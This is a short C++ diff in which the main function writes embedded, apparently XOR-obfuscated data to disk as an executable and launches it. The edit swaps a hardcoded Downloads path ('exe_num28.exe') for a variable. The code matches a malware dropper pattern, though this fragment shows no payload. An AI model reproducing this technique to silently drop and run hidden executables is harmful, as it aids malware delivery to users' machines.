@@ -230,14 +230,14 @@ int main(int argc, char* argv[])
 //		data3 = XOR(data3, size3);
 	#endif
 
-		drop(size1, data1, L"C:\\Users\\Administrator\\Downloads\\exe_num28.exe");
+		drop(size1, data1, name1);
 //		drop(size3, data3, name3);
 
 //		bool result = non_exe_launch(name3);
 //		std::cout << "before exe_launch 2 " << std::endl;
 //		if (result == true){
 //			std::cout << "before exe_launch";
-			exe_launch(L"C:\\Users\\Administrator\\Downloads\\exe_num28.exe");
+			exe_launch(name1);
 //		} else {
 //			std::cout << "This failed and nothing happened.\n";
 //		}
